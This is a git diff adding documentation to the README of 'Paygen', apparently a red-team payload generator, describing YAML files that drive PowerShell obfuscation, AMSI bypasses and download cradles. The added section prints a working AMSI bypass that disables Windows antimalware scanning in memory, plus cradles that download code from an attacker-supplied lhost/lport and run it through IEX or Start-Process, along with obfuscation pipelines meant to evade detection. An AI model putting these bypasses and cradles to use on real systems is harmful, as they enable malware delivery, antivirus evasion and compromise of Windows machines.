@@ -555,6 +555,179 @@ output_var: "encrypted_data"
 
 ---
 
+## YAML Configuration System
+
+Paygen uses YAML configuration files to define PowerShell obfuscation methods, AMSI bypasses, and download cradles. These files provide flexibility and easy customization without modifying source code.
+
+### Configuration Files
+
+Two main YAML configuration files control PowerShell features:
+
+- **ps-obfuscation.yaml** - Defines PowerShell obfuscation methods
+- **ps-features.yaml** - Defines AMSI bypasses and download cradles
+
+These files are located in the paygen root directory and can be customized to add new methods or modify existing ones.
+
+### ps-obfuscation.yaml
+
+Defines obfuscation methods with templated command strings for the `psobf` tool.
+
+**Format:**
+```yaml
+- name: Method Name
+  command: psobf command template with variables
+```
+
+**Available Variables:**
+
+| Variable | Description | Example |
+|----------|-------------|---------|
+| `{temp}` | Input file path (temporary file) | `/tmp/script_abc123.ps1` |
+| `{out}` | Output file path (obfuscated result) | `/tmp/script_obf_xyz789.ps1` |
+| `{hex_key}` | Random hex string for encryption | `A1B2C3D4E5F6` |
+| `{string_dict}` | Random number 0-100 for string dictionary | `75` |
+| `{dead_code}` | Random number 0-100 for dead code injection | `50` |
+| `{seed}` | Random number 0-10000 for randomization seed | `4832` |
+
+**Example:**
+```yaml
+- name: High - Maximum obfuscation
+  command: psobf -i {temp} -o {out} -q -level 5 -pipeline "hex_aes:{hex_key}|string_dict:{string_dict}|dead_code:{dead_code}" -seed {seed}
+
+- name: Medium - Balanced obfuscation
+  command: psobf -i {temp} -o {out} -q -level 3 -pipeline "string_dict:{string_dict}|dead_code:{dead_code}" -seed {seed}
+
+- name: Low - Light obfuscation
+  command: psobf -i {temp} -o {out} -q -level 1 -pipeline "string_dict:{string_dict}" -seed {seed}
+```
+
+### ps-features.yaml
+
+Defines AMSI bypasses and download cradles with optional obfuscation control.
+
+**Format:**
+```yaml
+- name: Feature Name
+  type: amsi | cradle-ps1 | cradle-exe | cradle-dll
+  no-obf: true | false  # Optional, default: false
+  code: |
+    PowerShell code or template
+```
+
+**Types:**
+
+- **amsi** - AMSI bypass code to inject at the beginning of PowerShell scripts
+- **cradle-ps1** - PowerShell cradle for downloading PS1 scripts
+- **cradle-exe** - PowerShell cradle for downloading EXE files
+- **cradle-dll** - PowerShell cradle for downloading DLL files
+
+**Available Variables:**
+
+| Variable | Description | Example |
+|----------|-------------|---------|
+| `{url}` | Base URL constructed from lhost/lport (without filename) | `http://192.168.1.100:8080` or `https://192.168.1.100` |
+| `{output_file}` | Output filename from payload parameters | `payload.exe` |
+
+**URL Construction Logic:**
+
+The `{url}` variable contains only the base URL without the output filename:
+
+- Port 80: `http://{lhost}`
+- Port 443: `https://{lhost}`
+- Other ports: `http://{lhost}:{lport}`
+
+In YAML cradle templates, combine `{url}` with `{output_file}` like: `{url}/{output_file}`
+
+**Example:**
+```yaml
+- name: IWR-IEX (Standard)
+  type: cradle-ps1
+  code: |
+    IWR -Uri "{url}/{output_file}" -UseBasicParsing | IEX
+```
+
+This gives you full control over how the URL is constructed in each cradle template.
+
+**no-obf Flag:**
+
+When set to `true`, the obfuscation dropdown is hidden for this method in the web UI. Use this for methods that don't work well with obfuscation or are already obfuscated.
+
+**Example AMSI Bypass:**
+```yaml
+- name: AmsiInitialize
+  type: amsi
+  no-obf: false
+  code: |
+    $a=[Ref].Assembly.GetTypes();
+    Foreach($b in $a) {
+        if ($b.Name -like "*iUtils") {
+            $c=$b
+        }
+    };
+    $d=$c.GetFields('NonPublic,Static');
+    Foreach($e in $d) {
+        if ($e.Name -like "*Context") {
+            $f=$e
+        }
+    };
+    $g=$f.GetValue($null);
+    [IntPtr]$ptr=$g;
+    [Int32[]]$buf = @(0);
+    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+
+**Example Cradle:**
+```yaml
+- name: IWR-IEX (Standard)
+  type: cradle-ps1
+  no-obf: false
+  code: |
+    IWR -Uri "{url}" -UseBasicParsing | IEX
+
+- name: DownloadFile (EXE)
+  type: cradle-exe
+  no-obf: false
+  code: |
+    (New-Object System.Net.WebClient).DownloadFile("{url}", "$env:TEMP\{output_file}");
+    Start-Process "$env:TEMP\{output_file}"
+```
+
+### Using YAML Configurations in Paygen
+
+**In Web Interface:**
+
+1. AMSI bypasses, obfuscation methods, and cradles are automatically loaded from YAML files
+2. Dropdowns are dynamically generated based on available methods
+3. The `no-obf` flag controls whether obfuscation options appear for each method
+4. When generating a payload, select desired methods and provide lhost/lport for cradles
+
+**Command Logging:**
+
+During payload build, exact commands executed are logged in the build steps:
+
+- AMSI bypass obfuscation: Shows `psobf` command used
+- PowerShell obfuscation: Shows `psobf` command with all substituted variables
+- Cradle generation: Shows constructed URL and obfuscation command if applied
+
+**Example Build Output:**
+```
+Step: Inserting AMSI bypass (AmsiInitialize) with obfuscation (High - Maximum obfuscation)
+AMSI bypass 'AmsiInitialize' inserted at beginning of script
+
+Command: psobf -i /tmp/bypass_abc123.ps1 -o /tmp/bypass_obf_xyz789.ps1 -q -level 5 -pipeline "hex_aes:A1B2C3|string_dict:75|dead_code:50" -seed 4832
+```
+
+### Configuration File Location
+
+Configuration files are referenced in `~/.config/paygen/config.yaml`:
+
+```yaml
+ps_obfuscation_yaml: /home/user/Documents/Tools/paygen/ps-obfuscation.yaml
+ps_features_yaml: /home/user/Documents/Tools/paygen/ps-features.yaml
+```
+
+---
+
 ## Development
 
 ### Running Tests
@@ -577,7 +750,7 @@ pytest tests/ -v
 - **Templates**: Jinja2
 - **Crypto**: PyCryptodome
 - **Testing**: pytest
-- **Theme**: Catppuccin Mocha
+- **UI Theme**: Catppuccin Mocha (hardcoded in CSS)
 
 ---
 
